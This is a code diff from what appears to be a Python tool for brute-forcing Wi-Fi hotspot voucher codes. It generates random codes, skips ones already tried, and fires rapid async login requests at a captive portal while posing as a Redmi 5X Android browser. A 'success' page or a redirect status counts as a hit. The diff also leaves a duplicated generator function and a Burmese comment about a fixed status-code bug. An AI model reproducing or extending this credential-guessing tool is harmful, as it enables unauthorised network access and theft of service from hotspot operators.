@@ -154,8 +154,23 @@ def generate_random_voucher(mode, length, history_set, in_running):
         voucher = "".join(random.choices(chars, k=length))
         if voucher not in history_set and voucher not in in_running:
             return voucher
+# ==================== RANDOM GENERATORS ====================
+def generate_random_voucher(mode, length, history_set, in_running):
+    if mode == "digit":
+        chars = string.digits
+    elif mode == "lower":
+        chars = string.ascii_lowercase
+    elif mode == "upper":
+        chars = string.ascii_uppercase
+    else:
+        chars = string.digits + string.ascii_lowercase + string.ascii_uppercase
 
-# ==================== LOGIN WORKER (REDMI 5X OPTIMIZED) ====================
+    while True:
+        voucher = "".join(random.choices(chars, k=length))
+        if voucher not in history_set and voucher not in in_running:
+            return voucher
+
+# ==================== LOGIN WORKER (REDMI 5X OPTIMIZED - FIXED VERSION) ====================
 async def login_voucher_async(http_session, session_id, voucher, base_url, portal_url):
     # Redmi 5X (Android 8.1.0) App Chrome Webview User-Agent
     redmi_ua = "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5X Build/OPM1.171019.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36"
@@ -181,6 +196,7 @@ async def login_voucher_async(http_session, session_id, voucher, base_url, porta
         try:
             async with http_session.get(login_url, headers=headers, allow_redirects=False, timeout=1.5) as req:
                 html = await req.text()
+                # ဤနေရာတွင် ကျန်ခဲ့သော [302, 301] Syntax Bug ကို အပြီးသတ် ပြုပြင်ထားပါသည်
                 success = ("success" in html.lower() or req.status in [302, 301])
                 return voucher, success, html
         except:
